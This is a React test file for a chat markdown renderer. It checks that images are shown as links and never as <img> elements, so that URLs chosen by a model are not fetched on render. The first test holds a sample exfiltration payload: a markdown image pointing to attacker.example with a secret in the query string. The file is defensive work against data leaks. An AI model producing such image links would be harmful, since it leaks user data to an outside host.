import { describe, it, expect } from "vitest";
import { render, screen } from "@testing-library/react";
import { ChatMarkdown } from "../chat/ChatMarkdown.js";

describe("ChatMarkdown images", () => {
  it("never renders an <img>, so a model-chosen URL is not fetched on render", () => {
    const { container } = render(
      <ChatMarkdown text="Here: ![status chart](https://attacker.example/p.png?d=s3cret)" />,
    );
    expect(container.querySelector("img")).toBeNull();
    const link = screen.getByRole("link", { name: /status chart/ });
    expect(link).toHaveAttribute("href", "https://attacker.example/p.png?d=s3cret");
  });

  it("falls back to the URL when there is no alt text", () => {
    render(<ChatMarkdown text="![](https://example.com/a.png)" />);
    expect(screen.getByRole("link", { name: /example\.com\/a\.png/ })).toBeInTheDocument();
  });

  it("does not nest a link inside a linked image", () => {
    const { container } = render(
      <ChatMarkdown text="[![logo](https://example.com/logo.png)](https://example.com/)" />,
    );
    expect(container.querySelector("img")).toBeNull();
    expect(container.querySelectorAll("a")).toHaveLength(1);
    expect(container.querySelector("a")).toHaveAttribute("href", "https://example.com/");
  });
});
